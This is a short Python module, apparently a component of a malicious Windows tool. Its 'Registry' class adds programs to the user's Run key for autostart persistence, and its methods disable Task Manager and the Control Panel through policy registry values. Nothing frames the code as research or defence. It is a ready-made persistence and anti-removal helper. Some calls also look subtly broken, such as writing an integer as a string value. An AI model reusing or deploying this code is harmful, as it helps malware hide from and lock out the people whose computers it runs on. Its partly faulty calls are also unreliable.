import winreg
import atexit
from typing import List

__all__ = ["Registry"]


class Registry:
    DISABLE_TASK_MGR: str = "DisableTaskMgr"
    DISABLE_CTRL_PNL: str = "NoControlPanel"

    def __init__(self) -> None:
        self.current = winreg.HKEY_CURRENT_USER
        self.auto = winreg.OpenKey(
            self.current,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            access=winreg.KEY_ALL_ACCESS,
        )
        atexit.register(winreg.CloseKey, self.auto)

    def disable_task_mgr(self) -> None:
        wr = winreg.OpenKey(
            self.current,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            access=winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(wr, self.DISABLE_TASK_MGR, 0, winreg.REG_SZ, 1)
        winreg.CloseKey(wr)

    def disable_ctrl_panel(self) -> None:
        wr = winreg.OpenKey(
            self.current,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            access=winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(wr, self.DISABLE_CTRL_PNL, 0, winreg.REG_SZ, 1)
        winreg.CloseKey(wr)

    def add_to_registry(self, key: str, value: str) -> None:
        winreg.CreateKey(self.auto, key)
        winreg.SetValueEx(self.auto, key, 0, winreg.REG_SZ, value)

    def remove_from_registry(self, key: str) -> None:
        winreg.DeleteValue(self.auto, key)

    def add_mul_registry(self, key: str, items: List[str]) -> None:
        winreg.CreateKey(self.auto, key)
        winreg.SetValueEx(self.auto, key, 0, winreg.REG_MULTI_SZ, items)

    def exists(self, key: str) -> bool:
        try:
            winreg.QueryValueEx(self.auto, key)
        except FileNotFoundError:
            return False
        else:
            return True
